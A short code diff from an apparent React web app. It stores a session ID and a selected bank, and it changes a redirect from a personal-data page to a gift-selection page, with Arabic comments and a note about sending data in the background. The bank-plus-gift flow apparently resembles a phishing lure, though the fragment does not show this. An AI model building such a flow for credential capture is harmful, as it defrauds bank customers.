@@ -71,8 +71,8 @@ export default function Home() {
     localStorage.setItem("sessionId", sessionId);
     localStorage.setItem("selectedBank", selectedBank);
     
-    // توجيه المستخدم فوراً لتحسين تجربة المستخدم
-    setLocation(`/personal-data?bank=${selectedBank}&session=${sessionId}`);
+    // توجيه المستخدم فوراً لصفحة اختيار الهدايا
+    setLocation(`/gift-selection?bank=${selectedBank}&session=${sessionId}`);
     
     // إرسال البيانات في الخلفية
     try {
